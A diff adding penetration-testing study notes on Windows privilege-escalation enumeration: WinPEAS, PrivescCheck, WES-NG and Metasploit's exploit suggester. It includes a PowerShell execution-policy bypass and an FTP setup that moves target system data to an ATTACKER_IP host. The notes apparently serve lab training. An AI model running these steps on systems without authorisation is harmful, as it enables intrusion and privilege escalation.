@@ -762,9 +762,67 @@ Global Group memberships     *None
 #### 3. Run command prompt as administrator.
   * Use `pwnd` credentials.
 # Tools of the Trade
-## WinPEAS
-## PrivescCheck
-## WES-NG: Windows Exploit Suggester - Next Generation
+* Scripts exist to shorten enumeration process times and uncover different potential privilege escalation vectors.
+* Automated tools can sometimes miss privilege escalation.
+## [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+* Script developed to enumerate target and uncover privelege escalation paths.
+* Download as precompiled executable or .bat script to target.
+* Redirect output to a file as output can be lengthy and difficult to read.
+```
+winpeas.exe > outputfile.txt
+```
+## [PrivescCheck](https://github.com/itm4n/PrivescCheck)
+* PowerShell script that searches common privilege escaltion on target.
+  * Does not require execution of binary file on target.
+* Need to bypass execution policy restrictions on target to run PrivescCheck.
+```
+Set-ExecutionPolicy Bypass -Scope process -Force
+ .\PrivescCheck.ps1
+Invoke-PrivescCheck
+```
+## [WES-NG: Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)
+* Python script.
+* Runs on attacking machine to avoid making unnecessary noise on target that can attract attention.
+* Install WES-NG.
+```
+git clone https://github.com/bitsadmin/wesng --depth 1
+```
+* Obtain latest database of vulnerabilities.
+  * Database used to check for missing patches that can result in vulnerabilities allowing elevation of privileges on target.
+```
+wes.py --update
+```
+* Use Windows `systeminfo.exe` on target to check for missing patches.
+* Redirect systeminfo output to file.
+```
+systeminfo > systeminfo.txt
+```
+* Copy systeminfo.txt to attacker machine.
+#### Set up VSFTPD to transfer file from target.
+1. `sudo apt update` to update Kali repositories.
+2. `sudo apt install vsftpd` to install package.
+3. `sudo systemctl start vsftpd.service` to load service.
+4. `sudo systemctl status vsftpd.service` to verify it is running.
+5. `sudo vim /etc/vsftp.conf` to open service's config file.
+  6. `i` to enter insert mode. 
+  7. Delete comment hash from "write_enable=YES" to enable file upload option.
+  8. `Esc` to exit insert mode.
+  9. `:wq` to save and close config file.
+10. `sudo systemctl restart vsftpd.service` to restart service.
+11. `sudo systemctl status vsftpd.service` to verify service is running.
+12. `sudo ifconfig` to identify IP address of FTP server (10.10.58.23).
+13. Go to Windows target.
+14. Open File Explorer.
+15. Type `ftp://ATTACKER_IP/ in navigation bar.
+16. Insert Kali credentials.
+17. Kali files and folders visible in Windows File Explorer.
+* Execute WES-NG.
+```
+wes.py systeminfo.txt
+```
 ## Metasploit
-
+* Module lists vulnerabilities that may affect target and allow elevation of privileges.
+```
+multi/recon/local_exploit_suggester
+```
 # Conclusion
